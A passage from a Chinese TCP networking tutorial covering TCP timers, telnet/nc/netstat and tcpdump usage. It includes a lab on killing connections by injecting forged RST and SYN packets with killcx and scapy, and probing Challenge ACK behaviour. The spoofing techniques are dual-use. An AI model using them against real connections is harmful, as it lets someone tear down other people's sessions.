tcpdump 差不多，会通过 libpcap 库抓取符合条件的包。 因此只有有数据传输的 tcp 连接它才可以拿到当前会话的序列号，通过这个序列号伪造 IP 发送符合条件的 RST 包。\n原理如下图所示\n可以看到 tcpkill 对每个端发送了 3 个RST 包，这是因为在高速数据传输的连接上，根据当前抓的包计算的序列号可能已经不再 TCP 连接的窗口内了，这种情况下 RST 包会被忽略，因此默认情况下 tcpkill 未雨绸缪往后计算了几个序列号。还可以指定参数-n指定更多的 RST 包，比如tcpkill -9\n根据上面的分析 tcpkill 的局限还是很明显的，无法杀掉一条僵死连接，下面我们介绍一个新的工具 killcx，看看它是如何来处理这种情况的。\nkillcx killcx 是一个用 perl 写的在 linux 下可以关闭 TCP 连接的脚本，无论 TCP 连接处于什么状态。\n下面来做一下实验，实验的前几步骤跟第一个例子中一模一样\n1、机器 c2(10.211.55.10) 启动 nc 命令监听 8080 端口，充当服务器端，记为 B\n1  nc -l 8080   2、机器 c2 启动 tcpdump 抓包\n1  sudo tcpdump -i any port 8080 -nn -U -vvv -w test.pcap   3、本地机器终端（10.211.55.2，记为 A）使用 nc 与 B 的 8080 端口建立 TCP 连接\n1  nc c2 8080   在服务端 B 机器上可以看到这条 TCP 连接\n1 2  netstat -nat | grep -i 8080 tcp 0 0 10.211.55.10:8080 10.211.55.2:61632 ESTABLISHED   4、客户端 A nc 命令行随便输入什么，这一步也完全可以省略，这里输入\u0026quot;hello\\n\u0026rdquo;\n5、执行 killcx 命令，注意 killcx 是在步骤 4 之后执行的\n1  sudo ./killcx 10.211.55.2:61632   可以看到服务端和客户端的 nc 进程已经退出了。\n抓包的结果如下\n前 5 个包都很正常，三次握手加上一次数据传输，有趣的事情从第 6 个包开始\n 第 6 个包是 killcx 伪造 IP 向服务端 B 发送的一个 SYN 包 第 7 个包是服务端 B 回复的 ACK 包，里面包含的 SEQ 和 ACK 号 第 8 个包是 killcx 伪造 IP 向服务端 B 发送的 RST 包 第 9 个包是 killcx 伪造 IP 向客户端 A 发送的 RST 包  整个过程如下图所示\n小结 这篇文章介绍了杀掉 TCP 连接的两个工具 tcpkill 和 killcx：\n tcpkill 采用了比较保守的方式，抓取流量等有新包到来的时候，获取 SEQ/ACK 号，这种方式只能杀掉有数据传输的连接 killcx 采用了更加主动的方式，主动发送 SYN 包获取 SEQ/ACK 号，这种方式活跃和非活跃的连接都可以杀掉  扩展阅读 有大神把 tcpkill 源代码魔改了一下，让 tcpkill 也支持了杀掉非活跃连接，原理上就是结合了 killcx 杀掉连接的方式，模拟 SYN 包。有兴趣的读者可以好好读一下：yq.aliyun.com/articles/59…\n30、ESTABLISHED 状态的连接收到 SYN 会回复什么？ 最初这个问题是读者上一个小册中的一个留言提出的：「处于 ESTABLISHED 的连接，为什么还要响应 SYN 包？」，这篇文章就来聊聊这一部分的内容。\n通过阅读这篇文章，你会了解到这些知识\n ESTABLISHED 状态的连接收到乱序包会回复什么 Challenge ACK 的概念 ACK 报文限速是什么鬼 SystemTap 工具在 linux 内核追踪中的使用 包注入神器 scapy 的使用 RST 攻击的原理 killcx 等工具利用 RST 攻击的方式来杀掉连接的原理  接下来开始文章的内容。\nscapy 实验复现现象 实验步骤如下：\n在机器 A(10.211.55.10) 使用 nc 启动一个服务程序，监听 9090 端口，如下所示。\n1  nc -4 -l 9090   机器 A 上同步使用 tcpdump 抓包，其中 -S 表示显示绝对序列号。\n1  sudo tcpdump -i any port 9090 -nn -S   在机器 B 使用 nc 命令连接机器 A 的 nc 服务器，输入 \u0026ldquo;hello\u0026rdquo; 。\n1  nc 10.211.55.10 9090   使用 netstat 可以看到此次连接的信息。\n1 2  Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name tcp 0 0 10.211.55.10:9090 10.211.55.20:50718 ESTABLISHED 9029/nc   在机器 B 上使用 scapy，模拟发送 SYN 包，scapy 脚本如下所示。\n1  send(IP(dst=\u0026#34;10.211.55.10\u0026#34;)/TCP(sport=50718, dport=9090, seq=10, flags=\u0026#39;S\u0026#39;))   源端口号 sport 使用此次连接的临时端口号 50718，序列号随便写一个，这里 seq 为 10。\n执行 scapy 执行上面的代码，tcpdump 中显示的包结果如下。\n1 2 3 4 5 6 7  // nc 终端中 hello 请求包 18:41:51.956735 IP 10.211.55.20.50718 \u0026gt; 10.211.55.10.9090: Flags [P.], seq 3219267420:3219267426, ack 2848436085, win 229, options [nop,nop,TS val 1094540820 ecr 12823113], length 6 18:41:51.956787 IP 10.211.55.10.9090 \u0026gt; 10.211.55.20.50718: Flags [.], ack 3219267426, win 227, options [nop,nop,TS val 12827910 ecr 1094540820], length 0  // scapy 的 SYN 包 18:44:32.373331 IP 10.211.55.20.50718 \u0026gt; 10.211.55.10.9090: Flags [S], seq 10, win 8192, length 0 18:44:32.373366 IP 10.211.55.10.9090 \u0026gt; 10.211.55.20.50718: Flags [.], ack 3219267426, win 227, options [nop,nop,TS val 12988327 ecr 1094540820], length 0   可以看到，对于一个 SEQ 为随意的 SYN 包，TCP 回复了正确的 ACK 包，其确认号为 3219267426。\n从 rfc793 文档中也可以看到：\n Linux 内核对于收到的乱序 SYN 报文，会回复一个携带了正确序列号和确认号的 ACK 报文。\n 这个 ACK 被称之为 Challenge ACK。\n我们后面要介绍的杀掉连接工具 killcx 的原理，正是是基于这一点。\n原因分析 为了方便说明，我们记发送 SYN 报文的一端为 A，处于 ESTABLISHED 状态接收 SYN 报文的一端为 B，B 对收到的 SYN 包回复 ACK 的原因是想让对端 A 确认之前的连接是否已经失效，以便做出一些处理。\n对于 A 而已，如果之前的连接还在，对于收到的 ACK 包，正常处理即可，不再讨论。\n如果 A 之前的此条连接已经不在了，此次 SYN 包是想发起新的连接，对于收到的 ACK 包，会立即回复一个 RST，且 RST 包的序列号就等于 ACK 包的序列号，B 收到这个合法的 RST 包以后，就会将连接释放。A 此时若想继续与 B 创建连接，则可以选择再次发送 SYN 包，重新建连，如下图所示。\n接下来我们来看内核源码的处理，\n内核源码分析 在这之前，我们需要先了解 SystemTap 工具的使用。SystemTap 是 Linux 中非常强大的调试探针工具，类似于 java 中的 javaagent instrument，可以获取一个内核函数运行时的入参变量、返回值、调用堆栈，甚至可以直接修改变量的值。这个工具详细的使用这里不展开，感兴趣的同学可以自行 Google。\n接下来我们来使用 SystemTap 这个工具来给内核插入 probe 探针，以 3.10.0 内核为例，内核中回复的 ack 的函数在 net/ipv4/tcp_output.c 的 tcp_send_ack 中实现。我们给这个函数插入调用探针，在端口号为 9090 时打印调用堆栈。新建一个 ack_test.stp 文件，部分代码如下所示。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47  %{ #include \u0026lt;net/sock.h\u0026gt; #include \u0026lt;linux/tcp.h\u0026gt; #include \u0026lt;linux/skbuff.h\u0026gt; #include \u0026lt;net/route.h\u0026gt; %}  function tcp_src_port:long(sk:long) { \treturn __tcp_sock_sport(sk) } function tcp_dst_port:long(sk:long) { \treturn __tcp_sock_dport(sk) } function tcp_src_addr:long(sk:long) { \treturn ntohl(__ip_sock_saddr(sk)) } function tcp_dst_addr:long(sk:long) { \treturn ntohl(__ip_sock_daddr(sk)) } function str_addr:string(addr, port) {  return sprintf(\u0026#34;%d.%d.%d.%d:%d\u0026#34;,  (addr \u0026amp; 0xff000000) \u0026gt;\u0026gt; 24,  (addr \u0026amp; 0x00ff0000) \u0026gt;\u0026gt; 16,  (addr \u0026amp; 0x0000ff00) \u0026gt;\u0026gt; 8,  (addr \u0026amp; 0x000000ff),  port  ) }  probe kernel.function(\u0026#34;tcp_send_ack@net/ipv4/tcp_output.c\u0026#34;) {  src_addr = tcp_src_addr($sk);  src_port = tcp_src_port($sk);  dst_addr = tcp_dst_addr($sk);  dst_port = tcp_dst_port($sk);  if (dst_port == 9090 || src_port == 9090)  {  printf(\u0026#34;send ack : %s:-\u0026gt;%s\\n\u0026#34;,  str_addr(src_addr, src_port),  str_addr(dst_addr, dst_port));  print_backtrace();  } }   使用 stap 命令执行上面的脚本\n1  sudo stap -g ack_test.stp   再次使用 scapy 发送一个 syn 包，内核同样会回复 ACK，此时 stap 输出结果如下。\n1 2 3 4 5 6 7 8 9 10  send ack : 10.211.55.10:9090:-\u0026gt;10.211.55.20:50718  0xffffffff815d0940 : tcp_send_ack+0x0/0x170 [kernel]  0xffffffff815cb1d2 : tcp_validate_incoming+0x212/0x2d0 [kernel]  0xffffffff815cb44d : tcp_rcv_established+0x1bd/0x760 [kernel]  0xffffffff815d5f8a : tcp_v4_do_rcv+0x10a/0x340 [kernel]  0xffffffff815d76d9 : tcp_v4_rcv+0x799/0x9a0 [kernel]  0xffffffff815b1094 : ip_local_deliver_finish+0xb4/0x1f0 [kernel]  0xffffffff815b1379 : ip_local_deliver+0x59/0xd0 [kernel]  0xffffffff815b0d1a : ip_rcv_finish+0x8a/0x350 [kernel]  0xffffffff815b16a6 : ip_rcv+0x2b6/0x410 [kernel]   可以看到这个 ACK 经过了下面这些函数调用。\n1 2 3 4 5  tcp_v4_rcv  -\u0026gt; tcp_v4_do_rcv  -\u0026gt; tcp_rcv_established  -\u0026gt; tcp_validate_incoming  -\u0026gt; tcp_send_ack   tcp_validate_incoming 函数精简后的部分代码如下所示。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20  static bool tcp_validate_incoming(struct sock *sk, struct sk_buff *skb, \tconst struct tcphdr *th) {\t\t// seq 不在窗口内 \t/* Step 1: check sequence number */ \tif (!tcp_sequence(tp, TCP_SKB_CB(skb)-\u0026gt;seq, TCP_SKB_CB(skb)-\u0026gt;end_seq)) { \t// RST 标记没有设置 \tif (!th-\u0026gt;rst) { \tif (th-\u0026gt;syn) \tgoto syn_challenge; \t} \tgoto discard; \t} \t\t/* step 4: Check for a SYN。 RFC 5961 4.2 : Send a challenge ack */ \tif (th-\u0026gt;syn) { syn_challenge: // 处理 SYN Challenge 的情况 \ttcp_send_challenge_ack(sk, skb); // \tgoto discard; \t}   tcp_send_challenge_ack 函数真正调用了 tcp_send_ack 函数。 这里的注释提到了 RFC 5961 4.2，说的正是 Challenge ACK 相关的内容。\n如果攻击者疯狂发送假的乱序包，接收端也跟着回复 Challenge ACK，会耗费大量的 CPU 和带宽资源。于是 RFC 5961 提出了 ACK Throttling 方案，限制了每秒钟发送 Challenge ACK 报文的数量，这个值由 net.ipv4.tcp_challenge_ack_limit 系统变量决定，默认值是 1000，也就是 1s 内最多允许 1000 个 Challenge ACK 报文。\n接下来使用 sysctl 将这个值改小为 1，如下所示。\n1  sudo sysctl -w net.ipv4.tcp_challenge_ack_limit=\u0026#34;1\u0026#34;   这样理论上在一秒内多次发送一个 Challenge ACK 包，接下来使用 scapy 在短时间内发送 5 次 SYN 包，看看内核是否只会回复一个 ACK 包，scapy 的脚本如下所示。\n1  send(IP(dst=\u0026#34;10.211.55.10\u0026#34;)/TCP(sport=50718,dport=9090,seq=10,flags=\u0026#39;S\u0026#39;), loop=0, count=5)   tcpdump 抓包结果如下。\n1 2 3 4 5 6  03:40:30.970682 IP 10.211.55.20.50718 \u0026gt; 10.211.55.10.9090: Flags [S], seq 10, win 8192, length 0 03:40:30.970771 IP 10.211.55.10.9090 \u0026gt; 10.211.55.20.50718: Flags [.], ack 3219267426, win 227, options [nop,nop,TS val 45146923 ecr 1094540820], length 0 03:40:30.974889 IP 10.211.55.20.50718 \u0026gt; 10.211.55.10.9090: Flags [S], seq 10, win 8192, length 0 03:40:30.975004 IP 10.211.55.20.50718 \u0026gt; 10.211.55.10.9090: Flags [S], seq 10, win 8192, length 0 03:40:30.978643 IP 10.211.55.20.50718 \u0026gt; 10.211.55.10.9090: Flags [S], seq 10, win 8192, length 0 03:40:30.981987 IP 10.211.55.20.50718 \u0026gt; 10.211.55.10.9090: Flags [S], seq 10, win 8192, length 0   可以看到确实是只对第一个 SYN 包回复了一个 ACK 包，其它的四个 SYN 都没有回复 ACK。\n小结 这篇文章介绍了为什么 ESTABLISHED 状态连接的需要对 SYN 包做出响应，Challenge ACK 是什么，使用 scapy 复现了现象，演示了 SystemTap 内核探针调试工具的使用，最后通过修改系统变量复现了 ACK 限速。\n31、定时器一览 —— 细数 TCP 的定时器们 TCP 为每条连接建立了 7 个定时器：\n 连接建立定时器 重传定时器 延迟 ACK 定时器 PERSIST 定时器 KEEPALIVE 定时器 FIN_WAIT_2 定时器 TIME_WAIT 定时器  大部分定时器在前面的文章已经介绍过了，这篇文章来总结一下。\n0x01 连接建立定时器（connection establishment） 当发送端发送 SYN 报文想建立一条新连接时，会开启连接建立定时器，如果没有收到对端的 ACK 包将进行重传。\n可以用一个最简单的 packetdrill 脚本来模拟这个场景\n1 2 3 4 5  // 新建一个 server socket +0 socket(..., SOCK_STREAM, IPPROTO_TCP) = 3  // 客户端 connect +0 connect(3, ..., ...) = -1   抓包结果如下\n在我的电脑上，将重传 6 次（间隔 1s、2s、4s、8s、16s、32s），6 次重试以后放弃重试，connect 调用返回 -1，调用超时，\n这个值是由/proc/sys/net/ipv4/tcp_syn_retries决定的， 在我的 Centos 机器上，这个值等于 6\n整个过程如下：\n如果是用 Java 语言就会返回java.net.ConnectException: Connection timed out异常\n0x02 重传定时器（retransmission） 第一个定时器讲的是连接建立没有收到 ACK 的情况，如果在发送数据包的时候没有收到 ACK 呢？这就是这里要讲的第二个定时器重传定时器。重传定时器在之前的文章中有专门一篇文章介绍，重传定时器的时间是动态计算的，取决于 RTT 和重传的次数。\n还是用 packetdrill 脚本的方式来模拟\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18  0 socket(..., SOCK_STREAM, IPPROTO_TCP) = 3 +0 setsockopt(3, SOL_SOCKET, SO_REUSEADDR, [1], 4) = 0 +0 bind(3, ..., ...) = 0 +0 listen(3, 1) = 0  // 三次握手 +0 \u0026lt; S 0:0(0) win 4000 \u0026lt;mss 1000\u0026gt; +0 \u0026gt; S. 0:0(0) ack 1 \u0026lt;...\u0026gt; +.1 \u0026lt; . 1:1(0) ack 1 win 4000 +0 accept(3, ..., ...) = 4  // 往 fd 为 4 的 socket 文件句柄写入 1000 个字节数据（也即向客户端发送数据） +0 write(4, ..., 1000) = 1000  // 注释掉 向协议栈注入 ACK 包的代码，模拟客户端不回 ACK 包的情况 // +.1 \u0026lt; . 1:1(0) ack 1001 win 1000  +0 `sleep 1000000`   抓包结果如下\n重传时间间隔是指数级退避，直到达到 120s 为止，重传次数是15次（这个值由操作系统的 /proc/sys/net/ipv4/tcp_retries2 决定)，总时间将近 15 分钟。\n整个过程如下图\n0x03 延迟 ACK 定时器 在 TCP 收到数据包以后在没有数据包要回复时，不马上回复 ACK。这时开启一个定时器，等待一段时间看是否有数据需要回复。如果期间有数据要回复，则在回复的数据中捎带 ACK，如果时间到了也没有数据要发送，则也发送 ACK。在 Centos7 上这个值为 40ms。这里在延迟确认章节有详细的介绍，不再展开。\n0x04 坚持计时器（persist timer） 坚持计时器这个翻译真是很奇葩，下面我用 Persist 定时器来讲述。\nPersist 定时器是专门为零窗口探测而准备的。我们都知道 TCP 利用滑动窗口来实现流量控制，当接收端 B 接收窗口为 0 时，发送端 A 此时不能再发送数据，发送端此时开启 Persist 定时器，超时后发送一个特殊的报文给接收端看对方窗口是否已经恢复，这个特殊的报文只有一个字节。\n0x05 保活定时器（keepalive timer） 如果通信以后一段时间有再也没有传输过数据，怎么知道对方是不是已经挂掉或者重启了呢？于是 TCP 提出了一个做法就是在连接的空闲时间超过 2 小时，会发送一个探测报文，如果对方有回复则表示连接还活着，对方还在，如果经过几次探测对方都没有回复则表示连接已失效，客户端会丢弃这个连接。\n0x06 FIN_WAIT_2 定时器 四次挥手过程中，主动关闭的一方收到 ACK 以后从 FIN_WAIT_1 进入 FIN_WAIT_2 状态等待对端的 FIN 包的到来，FIN_WAIT_2 定时器的作用是防止对方一直不发送 FIN 包，防止自己一直傻等。这个值由/proc/sys/net/ipv4/tcp_fin_timeout 决定，在我的 Centos7 机器上，这个值为 60s\n0x07 TIME_WAIT 定时器 TIME_WAIT 定时器也称为 2MSL 定时器，可能是这七个里面名气最大的，主动关闭连接的一方在 TIME_WAIT 持续 2 个 MSL 的时间，超时后端口号可被安全的重用。\nTIME_WAIT存在的意义有两个：\n 可靠的实现 TCP 全双工的连接终止（处理最后 ACK 丢失的情况） 避免当前关闭连接与后续连接混淆（让旧连接的包在网络中消逝）  小结 以上就是 TCP 的 7 个定时器的全部内容，每一个的细节都在之前的文章中有详细的介绍，如果有不太明白的地方可以翻阅\n32、网络工具篇（一） —— telnet、nc、netstat 今天我们来介绍三个常用的命令：telnet、nc 和 netstat\n命令一：telnet 现在 telnet server 几乎没有人在用了，但是 telnet client 却被广泛的使用着。它的功能已经比较强大，有较多巧妙的用法。下面选取几个用的比较多的来介绍一下。\n0x01 检查端口是否打开 telnet 的一个最大作用就是检查一个端口是否处于打开，使用的命令是 telnet [domainname or ip] [port]，这条命令能告诉我们到远端 server 指定端口的网连接是否可达。\n telnet [domainname or ip] [port]\n telnet 第一个参数是要连接的域名或者 ip，第二个参数是要连接的端口。\n比如你要连接 220.181.57.216（百度) 服务器上的 80 端口，可以使用如下的命令：telnet 220.181.57.216 80\n如果这个网络连接可达，则会提示你Connected to 220.181.57.216，输入control ]可以给这个端口发送数据包了\n如果网路不可达，则会提示telnet: Unable to connect to remote host和具体不能连上的原因，常见的有 Operation timed out、Connection refused。\n比如我本机没有进程监听 90 端口，telnet 127.0.0.1 90的信息如下\n0x02 telnet 还能发 http 请求？ 我们知道 curl 可以方便的发送 http 请求，telnet 也是可以方便的发送 http 请求的\n执行 telnet www.baidu.com 80，粘贴下面的文本（注意总共有四行，最后两行为两个空行）\n1 2  GET / HTTP/1.1 Host: www.baidu.com   可以看到返回了百度的首页\n1 2 3 4 5 6 7 8 9 10 11 12 13  ➜ telnet www.baidu.com 80 Trying 14.215.177.38... Connected to www.a.shifen.com. Escape character is \u0026#39;^]\u0026#39;. GET / HTTP/1.1 Host: www.baidu.com  HTTP/1.1 200 OK Accept-Ranges: bytes Cache-Control: no-cache Connection: Keep-Alive Content-Length: 14615 ...   0x03 telnet 还可以连接 Redis 假设 redis 服务器跑在本地，监听 6379端口，用 telnet 6379 命令可以连接上。接下来就可以调用 redis 的命令。\n调用\u0026quot;set hello world\u0026rdquo;，给 key 为 hello 设置值为 \u0026ldquo;world\u0026rdquo;，随后调用 get hello 获取值\nRedis 客户端和 Redis 服务器使用 RESP 协议通信，RESP 是 REdis Serialization Protocol 的简称。在 RESP 中，通过检查服务器返回数据的第一个字节来确定这个回复是什么类型：\n 对于 Simple Strings 来说，第一个字节是 \u0026ldquo;+\u0026rdquo; 对于 Errors 来说，第一个字节是 \u0026ldquo;-\u0026rdquo; 对于 Integers 来说，第一个字节是 \u0026ldquo;:\u0026rdquo; 对于 Bulk Strings 来说，首字节是 \u0026ldquo;$\u0026rdquo; 对于 Arrays 来说，首字节是 \u0026ldquo;*\u0026rdquo;   RESP Simple Strings\n Simple Strings 被用来传输非二进制安全的字符串，是按下面的方式进行编码: 一个加号，紧接着是不包含 CR 或者 LF 的字符串(不允许换行)，最后以CRLF(\u0026quot;\\r\\n\u0026quot;)结尾。\n执行 \u0026ldquo;set hello world\u0026rdquo; 命令成功，服务器会响应一个 \u0026ldquo;OK\u0026rdquo;，这是 RESP 一种 Simple Strings 的场景，这种情况下，OK 被编码为五个字节：+OK\\r\\n\n RESP Bulk Strings\n get 命令读取 hello 的值，redis 服务器返回 $5\\r\\nworld\\r\\n，这种类型属于是 Bulk Strings 被用来表示二进制安全的字符串。\nBulk Strings 的编码方式是下面这种方式：以 \u0026ldquo;$\u0026rdquo; 开头，后跟实际要发送的字节数，随后是 CRLF，然后是实际的字符串数据，最后以 CRLF 结束。\n所以 \u0026ldquo;world\u0026rdquo; 这个 string 会被编码成这样：$5\\r\\nworld\\r\\n\n命令二：netcat netcat 因为功能强大，被称为网络工具中的瑞士军刀，nc 是 netcat 的简称。这篇文章将介绍 nc 常用的几个场景。\n0x01 用 nc 来当聊天服务器 实验步骤\n  在服务器（10.211.55.5）命令行输入 nc -l 9090\n这里的\n1  -l   参数表示 nc 将监听某个端口，\n1  l   的含义是 listen。后面紧跟的 9090 表示要监听的端口号为 9090。\n  在另外客户端机器的终端中输入nc 10.211.55.5 9090\n此时两台机器建立了一条 tcp 连接\n  在客户端终端中输入 \u0026ldquo;Hello, this is a message from client\u0026rdquo;\n可以看到服务器终端显示出了客户端输入的消息\n  在服务器终端输入 \u0026ldquo;Hello, this is a message from server\u0026rdquo;\n可以看到客户端终端显示了刚刚服务器端输入的消息\n  如果不想继续聊下去，在任意一端输入\u0026quot;Ctrl c\u0026quot;都会终止这个连接。\n当然，真正在现实场景中用 nc 来聊天用的非常少。nc -l命令一个有价值的地方是可以快速的启动一个 tcp server 监听某个端口。\n0x02 发送 http 请求 先访问一次 www.baidu.com 拿到百度服务器的 ip（183.232.231.172）\n输入 \u0026ldquo;nc 183.232.231.172 80\u0026rdquo;，然后输入enter，\n1 2 3  nc 183.232.231.172 80 \u0026lt;enter\u0026gt; \u0026lt;enter\u0026gt;   百度的服务器返回了一个 http 的报文 HTTP/1.1 400 Bad Request\n来回忆一下 HTTP 请求报文的组成：\n 起始行（start line） 首部（header） 可选的内容主体（body）  1 2 3 4 5  nc 183.232.231.172 80 GET / HTTP/1.1 host: www.baidu.com \u0026lt;enter\u0026gt; \u0026lt;enter\u0026gt;   除了狂按 enter，你也可以采用 unix 管道的方式，把 HTTP 请求报文传输过去\n1  echo -ne \u0026#34;GET / HTTP/1.1\\r\\nhost:www.baidu.com\\r\\n\\r\\n\u0026#34; | nc 183.232.231.172 80   echo 的 -n 参数很关键，echo 默认会在输出的最后增加一个换行，加上 -n 参数以后就不会在最后自动换行了。\n执行上面的命令，可以看到也返回了百度的首页 html\n0x03 查看远程端口是否打开 前面介绍过 telnet 命令也可以检查远程端口是否打开，既然 nc 被称为瑞士军刀，这个小功能不能说不行。\n nc -zv [host or ip] [port]\n 其中 -z 参数表示不发送任何数据包，tcp 三次握手完后自动退出进程。有了 -v 参数则会输出更多详细信息（verbose）。\n0x04 访问 redis nc 为 在没有 redis-cli 的情况下访问 redis 又新增了一种方法\n1 2 3 4 5 6  nc localhost 6379 ping +PONG get hello $5 world   同样可以把命令通过管道的方式传给 redis 服务器。\n1 2  echo ping | nc localhost 6379 +PONG   命令三：netstat netstat 很强大的网络工具，可以用来显示套接字的状态。下面来介绍一下常用的命令选项\n列出所有套接字 1  netstat -a   -a命令可以输出所有的套接字，包括监听的和未监听的套接字。 示例输出：\n只列出 TCP 套接字 1 2  netstat -at -t` 选项可以只列出 TCP 的套接字，也可也用`--tcp   示例输出\n只列出 UDP 连接 1  netstat -au   -u 选项用来指定显示 UDP 的连接，也可也用--udp 示例输出：\n只列出处于监听状态的连接 1  netstat -l   -l 选项用来指定处于 LISTEN 状态的连接，也可以用--listening 示例输出：\n与-a一样，可以组合-t来过滤处于 listen 状态的 TCP 连接\n1  netstat -lt   示例输出\n禁用端口 和 IP 映射 1  netstat -ltn   上面的例子中，常用端口都被映射为了名字，比如 22 端口输出显示为 ssh，8080 端口被映射为 webcache。大部分情况下，我们并不想 netstat 帮我们做这样的事情，可以加上-n禁用\n显示进程 1  netstat -ltnp   使用 -p命令可以显示连接归属的进程信息，在查看端口被哪个进程占用时非常有用 示例输出如下：\n显示所有的网卡信息 1  netstat -i   用 -i 命令可以列出网卡信息，比如 MTU 等\n示例输出\n到此，netstat 基本命令选项都介绍完了，可以管道操作进行进一步的过滤。\n显示 8080 端口所有处于 ESTABLISHED 状态的连接 1 2  netstat -atnp | grep \u0026#34;:8080\u0026#34; | grep ESTABLISHED tcp 0 0 10.211.55.10:8080 10.211.55.5:45438 ESTABLISHED 24972/nc   统计处于各个状态的连接个数 1 2 3 4 5 6  netstat -ant | awk \u0026#39;{print $6}\u0026#39; | sort | uniq -c | sort -n  1 established)  1 Foreign  2 LISTEN  3 TIME_WAIT  30 ESTABLISHED   使用 awk 截取出状态行，然后用 sort、uniq 进行去重和计数即可\n小结与思考题 这篇文章我们首先讲解了 telnet 的妙用，来回顾一下重点：第一， telnet 可以检查指定端口是否存在，用来判断指定的网络连接是否可达。第二 telnet 可以用来发送 HTTP 请求，HTTP 是基于 TCP 的应用层协议，可以认为 telnet 是 TCP 包的一个构造工具，只要构造出的包符合 HTTP 协议的格式，就可以得到正确的返回。第三，介绍了如何用 telnet 访问 redis 服务器，在没有安装 redis-cli 的情况下，也可以通过 telnet 的方式来快速进行访问，然后结合实际场景介绍了 Redis 的通信协议 RESP。\n然后介绍了 nc 在诸多类似场景下的应用，最后介绍了 netstat 命令的的用法。\n留一道作业题：\n 怎么样用 nc 发送 UDP 数据  欢迎你在留言区留言，和我一起讨论。\n33、网络工具篇（二） —— 网络包的照妖镜 tcpdump 如果你抓过 TCP 的包，你一定听说过图形化界面软件 wireshark，tcpdump 则是一个命令行的网络流量分析工具，功能非常强大。尤其是做后台开发的同学要在服务器上定位一些黑盒的应用，tcpdump 是唯一的选择。这篇文章会重点介绍基本使用、过滤条件、保存文件几个方面。\n大部分 Linux 发行包都预装了 tcpdump，如果没有预装，可以用对应操作系统的包管理命令安装，比如在 Centos 下，可以用 yum install -y tcpdump 来进行安装。\nTCPDump 基础 在命令行里直接输入如下的命令，不出意外，会出现大量的输出\n1 2 3 4 5 6  tcpdump -i any  07:02:12.195611 IP test.ya.local.59915 \u0026gt; c2.shared.ssh: Flags [.], ack 1520940, win 2037, options [nop,nop,TS val 1193378555 ecr 428247729], length 0 07:02:12.195629 IP c2.shared.ssh \u0026gt; test.ya.local.59915: Flags [P.], seq 1520940:1521152, ack 1009, win 315, options [nop,nop,TS val 428247729 ecr 1193378555], length 212 07:02:12.195677 IP test.ya.local.59915 \u0026gt; c2.shared.ssh: Flags [.], ack 1521152, win 2044, options [nop,nop,TS val 1193378555 ecr 428247729], length 0 07:02:12.195730 IP c2.shared.ssh \u0026gt; test.ya.local.59915: Flags [P.], seq 1521152:1521508, ack 1009, win 315, options [nop,nop,TS val 428247730 ecr 1193378555], length 356   -i表示指定哪一个网卡，any 表示任意。有哪些网卡可以用 ifconfig 来查看，在我的虚拟机上，ifconfig 输出结果如下\n如果只想查看 eth0 网卡经过的数据包，就可以使用tcpdump -i eth0来指定。\n过滤主机：host 选项 如果只想查看 ip 为 10.211.55.2 的网络包，这个 ip 可以是源地址也可以是目标地址\n1  sudo tcpdump -i any host 10.211.55.2   过滤源地址、目标地址：src、dst 如果只想抓取主机 10.211.55.10 发出的包\n1  sudo tcpdump -i any src 10.211.55.10   如果只想抓取主机 10.211.55.10 收到的包\n1  sudo tcpdump -i any dst 10.211.55.1   过滤端口：port 选项 抓取某端口的数据包：port 选项比如查看 80 端通信的数据包\n1  sudo tcpdump -i any port 80   如果只想抓取 80 端口收到的包，可以加上 dst\n1  sudo tcpdump -i any dst port 80   过滤指定端口范围内的流量 比如抓取 21 到 23 区间所有端口的流量\n1  tcpdump portrange 21-23   禁用主机与端口解析：-n 与 -nn 选项 如果不加-n选项，tcpdump 会显示主机名，比如下面的test.ya.local和c2.shared\n1  09:04:56.821206 IP test.ya.local.59915 \u0026gt; c2.shared.ssh: Flags [P.], seq 397:433, ack 579276, win 2048, options [nop,nop,TS val 1200089877 ecr 435612355], length 36   加上-n选项以后，可以看到主机名都已经被替换成了 ip\n1 2  sudo tcpdump -i any -n 10:02:13.705656 IP 10.211.55.2.59915 \u0026gt; 10.211.55.10.ssh: Flags [P.], seq 829:865, ack 1228756, win 2048, options [nop,nop,TS val 1203228910 ecr 439049239], length 36   但是常用端口还是会被转换成协议名，比如 ssh 协议的 22 端口。如果不想 tcpdump 做转换，可以加上 -nn，这样就不会解析端口了，输出中的 ssh 变为了 22\n1 2 3  sudo tcpdump -i any -nn  10:07:37.598725 IP 10.211.55.2.59915 \u0026gt; 10.211.55.10.22: Flags [P.], seq 685:721, ack 1006224, win 2048, options [nop,nop,TS val 1203524536 ecr 439373132], length 36   过滤协议 如果只想查看 udp 协议，可以直接使用下面的命令\n1 2 3 4  sudo tcpdump -i any -nn udp  10:25:31.457517 IP 10.211.55.10.51516 \u0026gt; 10.211.55.1.53: 23956+ A? www.baidu.com. (31) 10:25:31.490843 IP 10.211.55.1.53 \u0026gt; 10.211.55.10.51516: 23956 3/13/9 CNAME www.a.shifen.com., A 14.215.177.38, A 14.215.177.39 (506)   上面是一个 www.baidu.com 的 DNS 查询请求的 UDP 包\n用 ASCII 格式查看包体内容：-A 选项 使用 -A 可以用 ASCII 打印报文内容，比如常用的 HTTP 协议传输 json 、html 文件等都可以用这个选项\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  sudo tcpdump -i any -nn port 80 -A  11:04:25.793298 IP 183.57.82.231.80 \u0026gt; 10.211.55.10.40842: Flags [P.], seq 1:1461, ack 151, win 16384, length 1460 HTTP/1.1 200 OK Server: Tengine Content-Type: application/javascript Content-Length: 63522 Connection: keep-alive Vary: Accept-Encoding Date: Wed, 13 Mar 2019 11:49:35 GMT Expires: Mon, 02 Mar 2020 11:49:35 GMT Last-Modified: Tue, 05 Mar 2019 23:30:55 GMT ETag: W/\u0026#34;5c7f06af-f822\u0026#34; Cache-Control: public, max-age=30672000 Access-Control-Allow-Origin: * Served-In-Seconds: 0.002   与 -A 对应的还有一个 -X 命令，用来同时用 HEX 和 ASCII 显示报文内容。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17  sudo tcpdump -i any -nn port 80 -X  11:33:53.945089 IP 36.158.217.225.80 \u0026gt; 10.211.55.10.45436: Flags [P.], seq 1:1461, ack 151, win 16384, 